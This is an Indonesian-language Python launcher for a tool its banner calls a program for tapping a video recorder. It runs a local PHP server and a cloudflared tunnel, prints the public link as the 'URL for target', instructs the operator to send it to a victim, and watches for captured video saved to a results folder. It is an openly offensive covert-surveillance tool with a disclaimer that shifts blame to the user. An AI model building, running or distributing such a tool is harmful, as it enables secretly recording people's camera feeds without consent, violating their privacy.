from calendar import c
import asyncio
import datetime
import os
import signal
import re
import time
import sys


# Warna
h  = ('\x1b[0;32m') # hijau gelap
ht = ('\x1b[38;5;40m') # hijau terang
b  = ('\x1b[0;36m') # biru gelap
bt = ('\x1b[36;1m') # biru terang
m  = ('\x1b[31;1m') # merah
p  = ('\x1b[37;1m') # putih
h  = ('\x1b[30;1m') # hitam
o  = ('\x1b[33;1m') # oren
kt  = ('\x1b[1;33m') # kuning terang
c  = ('\x1b[38;5;172m') # Coklat terang
b  = ('\x1b[0;34m') # biru tua
u  = ('\x1b[38;5;135m') # ungu
n  = ('\x1b[0;0m') # normal
mc = ('\x1b[38;5;52m') # Merah Coklat
pk = ('\x1b[38;5;207m') # pink
pn = ('\x1b[38;5;86m') # pesan

# Waktu
waktu_sekarang = datetime.datetime.now()
wkt = waktu_sekarang.strftime(f"{pk}%Y{kt}-{pk}%m{kt}-{pk}%d {pk}%H{kt}:{pk}%M{n}")

def find_cloudflare_urls(output):
    # Cari URL yang muncul di output dengan format https://*.trycloudflare.com
    pattern = r'https://\S+\.trycloudflare.com'
    urls = re.findall(pattern, output)

    # Cek apakah ada pesan "Konversi video selesai" dalam output
    conversion_complete_pattern = r'Output #0, mp4, to ' + re.escape('\'../hasil/output_') + r'\S+\.mp4\':'
    if re.search(conversion_complete_pattern, output):
        print(f"{m}[{kt}•{m}]{ht} Video Berhasil Didapatkan, Buka Difolder {kt}({n}hasil/file_hasilmu.mp4{kt}){n}")
        print(f"\n{m}[{kt}•{m}]{ht} CTRL+C Untuk Hentikan Program.!\n")
    return urls

def check_conversion_complete(output):
    # Cek apakah output mengandung tanda bahwa konversi selesai
    return " Selesai Menyimpan" in output

async def read_output(stream, queue, conversion_queue):
    while True:
        line = await stream.readline()
        if not line:
            break
        output_line = line.decode('utf-8')
        urls = find_cloudflare_urls(output_line)
        if urls:
            for url in urls:
                await queue.put(url)
                if "https://api.trycloudflare.com" not in url:
                    print(f"\n\n{m}[{kt}•{m}]{ht} URL Untuk Target{kt}:{n}", url, f"\n{n}")
                    print(f"\n{m}[{kt}•{m}]{ht} Bagikan link Tersebut Ke Target Dan Tunggu Hasilnya.!\n")

                if url == "https://api.trycloudflare.com":
                    print(f"\n{m}[{kt}•{m}]{ht} Sambungin Jaringan Dulu Goblok Assu..!!")
                    print(f"{m}[{kt}•{m}]{ht} Tekan Ctrl+c, Lalu Run Ulang..!!\n")       
        if check_conversion_complete(output_line):
            print(f"\n{m}[{kt}•{m}]{ht} CTRL+C Untuk Hentikan Program.!\n")
            await conversion_queue.put("Konversi video selesai, disimpan di")

async def run_php(queue):
    process = await asyncio.create_subprocess_shell("php -S localhost:5940", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await asyncio.gather(read_output(process.stdout, queue, asyncio.Queue()), read_output(process.stderr, queue, asyncio.Queue()))
    await process.wait()

async def run_cloudflared(queue):
    process = await asyncio.create_subprocess_shell("cloudflared tunnel --url localhost:5940", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await asyncio.gather(read_output(process.stdout, queue, asyncio.Queue()), read_output(process.stderr, queue, asyncio.Queue()))
    await process.wait()

# Pesan
pepes = (f"\n{m}[{kt}•{m}]{ht} Pertimbangkan Prifasi Orang Lain, Atas Pelanggaran Atau Hukum-\n    Author Tidak Bertangung Jawab, Dan Gunakan Sewajarnya Saja Cok.!\n")

# Teks Berjalan logo
speed_logo = 0.0007
def berjalan_teks(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(speed_logo)

# Mee
logser = (f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{kt}⡄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢇    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{kt}⠃⠸  {pk}   ⠀⠀⠀⣀⣠⡄{kt}⠀⠀⠀⠁⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀{kt}⠘  {pk}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⡶⠛⠛⠛⠟⢂⣶⣆⡀⠀     {kt}⠇⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀{kt}⠆  {pk}⠀⠀⠀⠀⠀⢀⣴⣿⠛⠛⢩⠇⠀⠀⠀⠀⠾⡇⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀{kt}⢰⢰⠀⠀⠀
⠀⠀⠀⠀⠀{kt}⣀      {pk}⠀⣠⠞⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀{kt}⠘⡄⡆⠀⠀
⠀⠀⠀{kt}⡉⠁      {pk}⠀⣰⡟⣣⠶⠛⠙⢻⣦⠀⠀⠀⠀⠀⢀⣴⠶⠚⠳⣾⣿⡀      {m}⢠⠒⠲⡄⢀⣀⠀⠀ {kt}⠇⢰⠀⠀
{kt}   ⠄⢡     {pk}⠀⢠⡿⣿⠋⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⢸⠃⠀⠀⠀⠈⣿⣇      {m}⢸⡀⠀⠙⠉⠀⢹⠀ {kt}⠰⠈⠀⠀
⠀⠀{kt}⢠      {pk}⠀⠀⣼⣼⠇⠀⣰⣾⣶⠀⢀⣿⢂⣠⣄⣀⣼⡄⢰⣿⣶⡄⠸⣿⡀      {m}⢣⡀⠀⢀⣠⠎  {kt}⠀⠒⠀⠀⠀
⠀{kt}  ⡆      {pk}⢠⣿⡿⠀⠀⢿⣿⠟⠀⢸⣿⡏⠁⠀⢙⣿⡇⠈⢿⣿⠇⠀⢻⣧⠀      {m}⠳⠖⠋ {kt}⠀⠀⠀⠀⠀⠰⠀
{pk}⡴⠉⠉⠓⠒⠒⠤⣄⡸⣿⣧⠀⠀⠀⣤⡄⠀⠀⠙⠿⠿⠿⠿⠋⠁⠀⠀⣤⡀⠀⣸⣿⣀⡤⠔⠒⠚⠉⠉⠳⡀         {kt}⠀⠃
{pk}⢧⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠋⠁⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀
⠘⢆⠀⠀⠀⠀⠀⠀⠈⣟⠙⠛⠷⣦⣄⣀⡀⠀⠀⢀⣀⠴⣲⢤⣀⣀⣠⣴⠾⠻⣿⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀
⠀⠈⢦⡀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠈⠉⠋⠉⠉⠉⠉⠀⠀⠀⠀⣿⠉⠀⠀⠀⣸⢿⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀
⠀⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⢧⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠙⣲⠒⠋⠀⠀⠀⠀     *********** ⠀⠀⠀⠀⠈⢻⡒⠊⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀ *⠀⠀⠀⠀⠀⠀⠀ *⠀⠀⠀⠀⠀⠀⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀{kt}⡀ {pk}⠀⡴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  *⠀ S&L⠀ *⠀⠀⠀⠀⠀  ⠨⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡜⢀⡇⠀⠀⠀⠀⢠⠴⢤⣠⠴⠶⡄⠀ *⠀⠀⠀⠀*⠀⠀⢀⡴⠖⢻⣀⣀⣒⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡜⠀⠀⡇⠀⠀⠀⢠⠃⠀⡆⠀⠀⠀⠉⠉⣷⠀****⠀⠀⢀⡎⠀⢀⠀⠀⠀⠿⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣧⠀⠀⠹⡄⠀⠀⢸⠀⠀⡇⠀⠀⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⠳⠤⠤⣹⣦⡀⠸⡄⠀⠹⡄⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠸⠀⢀⠼⠁⠀         {kt}⢱{pk}⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠦⣄⣁⣀⣤⠾⠓⠒⠉⠉⠉⠉⠉⠉⠉⠑⠛⠢⠤⠴⠋⠀⠀        {kt}⠠⠘⠀⠀⠀⠀⠀⠀⠀

              {bt}===={m}[ {ht}Auth{kt}: {ht}Yan{kt}-{ht}Xd {m}]{bt}====
            {bt}===={m}[{h} {wkt} {m}]{bt}====
   {bt}===={m}[ {kt}Program Untuk Sadap Video Recorder {m}]{bt}===={n}\n""")

async def process_urls(queue, conversion_queue):
    try:
        while True:
            url = await queue.get()
            if url:
                # Proses URL Cloudflared
                pass
    except asyncio.CancelledError:
        pass

async def process_conversions(conversion_queue):
    try:
        while True:
            message = await conversion_queue.get()
            if message:
                print(message)
    except asyncio.CancelledError:
        pass

async def main():
    queue = asyncio.Queue()
    conversion_queue = asyncio.Queue()
    process_queue = asyncio.create_task(process_urls(queue, conversion_queue))
    conversion_process = asyncio.create_task(process_conversions(conversion_queue))
    # Jalankan perintah PHP dan cloudflared secara bersamaan
    tasks = asyncio.gather(run_php(queue), run_cloudflared(queue), process_queue, conversion_process)

    try:
        await tasks
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    os.system("clear")
    berjalan_teks(logser)

    # Cetak pesan dulu
    for charlex in pepes:
        print(charlex, end='', flush=True,)
        time.sleep(0.05)

    input(f"\n{m}[{kt}•{m}]{ht} Enter Untuk Jalankan Program{kt}:{n}")
    os.system("clear")
    berjalan_teks(logser)

    loop = asyncio.get_event_loop()

    async def handle_keyboard_interrupt():
        print(f"\n{m}[{kt}•{m}]{ht} Menutup Semua Server Yang Berjalan, Good Luck...\n")

        for task in asyncio.all_tasks():
            task.cancel()

        try:
            # Tunggu maksimal 15 detik untuk proses cloudflared selesai
            await asyncio.wait_for(asyncio.gather(*asyncio.all_tasks()), timeout=15)
        except asyncio.TimeoutError:
            pass

        loop.stop()

    loop.add_signal_handler(signal.SIGINT, lambda: asyncio.create_task(handle_keyboard_interrupt()))

    try:
        loop.run_until_complete(main())
    except asyncio.CancelledError:
        pass
    finally:
        loop.run_until_complete(loop.shutdown_asyncgens())
        loop.close()
